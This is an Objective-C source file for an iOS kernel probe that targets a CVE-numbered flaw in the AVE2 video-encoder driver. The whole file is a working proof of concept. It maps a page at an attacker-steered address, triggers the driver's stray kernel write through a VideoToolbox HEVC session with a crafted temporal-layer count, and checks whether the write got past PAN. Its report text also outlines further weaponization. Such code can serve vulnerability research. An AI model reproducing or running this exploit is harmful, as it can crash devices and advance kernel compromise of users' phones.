#import "KPAuditAVEPANModule.h"
#import <UIKit/UIKit.h>
#import "KPLog.h"
#import <VideoToolbox/VideoToolbox.h>
#import <CoreVideo/CoreVideo.h>
#import <sys/mman.h>
#import <unistd.h>

@interface KPAuditAVEPANModule ()
@property (nonatomic, assign) int ntl;
@property (nonatomic, copy) NSString *identifier;
@property (nonatomic, copy) NSString *title;
@property (nonatomic, copy) NSString *subtitle;
@property (nonatomic, copy) NSString *icon;
@property (nonatomic, assign) KPTestSection section;
@end

@implementation KPAuditAVEPANModule

- (instancetype)initWithTemporalLayers:(int)ntl {
    self = [super init];
    if (self) {
        _ntl = ntl;
        _identifier = [NSString stringWithFormat:@"ave112705.pan%d.armed", ntl];
        _title = [NSString stringWithFormat:@"AVE2 PAN test NTL=%d", ntl];
        _subtitle = @"Map a page at the steered address, fire, read it back — kernel->user write or PAN panic";
        _icon = @"memorychip";
        _section = KPTestSectionKernelProbes;
    }
    return self;
}

- (void)journal:(NSString *)line {
    // Documents, not tmp: house_arrest AFC can pull it after a reboot.
    NSString *path = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject
                      stringByAppendingPathComponent:@"kp-ave-pan-journal.log"];
    NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:path];
    if (!fh) {
        [[NSFileManager defaultManager] createFileAtPath:path contents:nil attributes:nil];
        fh = [NSFileHandle fileHandleForWritingAtPath:path];
    }
    [fh seekToEndOfFile];
    [fh writeData:[[line stringByAppendingString:@"\n"] dataUsingEncoding:NSUTF8StringEncoding]];
    [fh synchronizeFile];
    [fh closeFile];
    [KPLog.shared appendFormat:@"[ave-pan] %@", line];
}

#pragma mark - Report

- (NSString *)runReport {
    NSMutableString *report = [NSMutableString string];
    [report appendString:@"=== KexProofV4 · CVE-2026-112705 · PAN transparency test ===\n"];
    [report appendString:@"Write address law: ((NTL-16463) << 32) | 0x59, stores at +0, +8, +0x10 (x0)\n"];
    [report appendString:@"and 0 at +0x18 (27.0.1 list-init). We map THAT address from userland,\n"];
    [report appendString:@"fire the trigger, then read the page back:\n"];
    [report appendString:@"  page holds our self-pointer -> kernel write LANDED (PAN off!) = primitive\n"];
    [report appendString:@"  kernel panic with far = mapped addr -> PAN blocks it, AVE closes as DoS\n"];
    [report appendString:@"  mmap refused -> the VA is not allocatable here, try another NTL\n"];
    [report appendFormat:@"Target: iOS %@ uid=%d  NTL=%d\n",
        UIDevice.currentDevice.systemVersion, getuid(), self.ntl];

    int64_t k = (int64_t)self.ntl - 16463;
    uint64_t writeAddr = ((uint64_t)(uint32_t)k << 32) | 0x59ULL;
    uint64_t pageBase = writeAddr & ~0x3FFFULL; // 16 KB align
    [report appendFormat:@"steered write addr = 0x%llx  page base = 0x%llx\n", writeAddr, pageBase];

    // The 0x1_00000000 range is where the APP BINARY lives — mmap FIXED there
    // collides (errno=12). Only use addresses at/above 0x4_00000000 (K>=4).
    if (pageBase < 0x400000000ULL) {
        [report appendString:@"\nVERDICT: ADDRESS_COLLIDES_WITH_APP_TEXT\n"];
        [report appendString:@"0x1xxxxxxxx is the app's own mapping; use NTL>=16467 (K>=4).\n"];
        return report;
    }

    // 1) map the page at the steered address
    void *page = mmap((void *)(uintptr_t)pageBase, 0x4000,
                      PROT_READ | PROT_WRITE,
                      MAP_PRIVATE | MAP_ANON | MAP_FIXED, -1, 0);
    if (page == MAP_FAILED) {
        [report appendFormat:@"\nVERDICT: MMAP_FAILED errno=%d — the steered VA is not allocatable\n", errno];
        [report appendString:@"(iOS user VA layout refuses this range; pick another NTL and retry).\n"];
        return report;
    }
    memset(page, 0xA1, 0x4000);
    // sanity: our own write works
    *(volatile uint64_t *)((uintptr_t)page + (writeAddr - pageBase)) = 0xDEADBEEFCAFEBABEULL;
    [self journal:[NSString stringWithFormat:@"PAGE_MAPPED base=0x%llx probe=ok", pageBase]];

    // 2) victim session + trigger
    VTCompressionSessionRef session = NULL;
    OSStatus s = VTCompressionSessionCreate(kCFAllocatorDefault, 1280, 720,
                                            kCMVideoCodecType_HEVC,
                                            NULL, NULL, NULL,
                                            NULL, NULL, &session);
    if (s != noErr || !session) {
        munmap(page, 0x4000);
        [report appendString:@"\nVERDICT: SESSION_CREATE_FAILED\n"];
        return report;
    }
    int usage = 1;
    VTSessionSetProperty(session, CFSTR("EncoderUsage"), (__bridge CFNumberRef)@(usage));
    int ntl = self.ntl;
    VTSessionSetProperty(session, CFSTR("NumberOfTemporalLayers"), (__bridge CFNumberRef)@(ntl));

    CVPixelBufferRef pb = NULL;
    CVPixelBufferCreate(kCFAllocatorDefault, 1280, 720,
                        kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange, NULL, &pb);
    if (pb) {
        CVPixelBufferLockBaseAddress(pb, 0);
        memset(CVPixelBufferGetBaseAddressOfPlane(pb, 0), 0x40,
               CVPixelBufferGetBytesPerRowOfPlane(pb, 0) * 720);
        memset(CVPixelBufferGetBaseAddressOfPlane(pb, 1), 0x80,
               CVPixelBufferGetBytesPerRowOfPlane(pb, 1) * 360);
        CVPixelBufferUnlockBaseAddress(pb, 0);
    }

    [self journal:[NSString stringWithFormat:@"BEFORE_PAN_ENCODE ntl=%d write_addr=0x%llx (device may reboot)", ntl, writeAddr]];
    if (pb) {
        VTCompressionSessionEncodeFrame(session, pb, CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
        usleep(500000); // bounded: never CompleteFrames(kCMTimeInvalid) - hangs on faulted sessions
    }
    [self journal:@"AFTER_PAN_ENCODE survived — checking the page"];

    // 3) read the page back
    uint64_t got = *(volatile uint64_t *)((uintptr_t)page + (writeAddr - pageBase));
    uint64_t got8 = *(volatile uint64_t *)((uintptr_t)page + (writeAddr - pageBase) + 8);
    uint64_t got10 = *(volatile uint64_t *)((uintptr_t)page + (writeAddr - pageBase) + 0x10);
    uint32_t got18 = *(volatile uint32_t *)((uintptr_t)page + (writeAddr - pageBase) + 0x18);
    [report appendFormat:@"\npage readback: [+0]=0x%llx [+8]=0x%llx [+0x10]=0x%llx [+0x18]=0x%x\n",
        got, got8, got10, got18];
    [report appendFormat:@"expected if kernel store landed: all three = 0x%llx, [+0x18]=0\n", writeAddr];

    if (pb) CVPixelBufferRelease(pb);
    VTCompressionSessionInvalidate(session);
    CFRelease(session);
    munmap(page, 0x4000);

    BOOL landed = (got == writeAddr && got8 == writeAddr && got10 == writeAddr && got18 == 0);
    [report appendString:@"\nVERDICT: "];
    [report appendString:landed ? @"KERNEL_WRITE_LANDED\n" : @"NO_KERNEL_WRITE_OBSERVED\n"];
    [report appendString:
     landed
      ? @"PAN is transparent in this driver path — the kernel wrote to our user\n"
        @"page. The self-pointer value is limited, but kernel->user reach is REAL\n"
        @"and the address is NTL-steered. Weaponization: combine with a second\n"
        @"write gadget or find a driver path that stores a controlled VALUE.\n"
      : @"The page was untouched and the process survived — either the encode\n"
        @"never reached the store (check journal) or the write went elsewhere.\n"
        @"If instead the device reboots: pull the panic — far == our mapped addr\n"
        @"means PAN blocked a mapped page (AVE closes as DoS-only).\n"];
    return report;
}

@end
